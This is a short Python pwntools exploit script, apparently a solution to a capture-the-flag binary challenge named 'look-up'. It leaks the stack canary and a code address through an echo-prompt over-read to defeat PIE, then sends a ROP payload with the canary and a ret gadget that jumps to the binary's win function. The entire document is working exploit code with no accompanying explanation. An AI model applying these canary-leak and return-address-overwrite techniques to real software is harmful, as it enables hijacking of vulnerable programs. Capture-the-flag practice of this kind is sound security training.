from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("./look-up")

# p = gdb.debug(elf.path, gdbscript='continue')
p = process()
#p = remote("look-up.uctf.ir", 5000)

# Leak canary
while True:
  p.sendafter("--- I'll repeat what you say :D ---\n", "UCTF"+"A"*6+'\n')
  p.recvline()
  try:
    canary = u64(p.recvline().strip().ljust(8, b'\x00')) << 8
    log.success(f'canary leaked: {hex(canary)}')
    break
  except:
    continue

p.sendafter("--- I'll repeat what you say :D ---\n", "UCTF"+"A"*21+'\n')
p.recvline()
vuln169 = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'<vuln>+169 leaked: {hex(vuln169)}')
elf.address = vuln169 - 4920

rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]
payload = flat(
    "A"*10,
    p64(canary)*2,
    RET,
    elf.sym['win']
)

p.sendlineafter("--- I'll repeat what you say :D ---\n",payload)

#gdb.attach(p, gdbscript="""
#init-pwndbg
#canary
#pie
#""")

p.interactive()
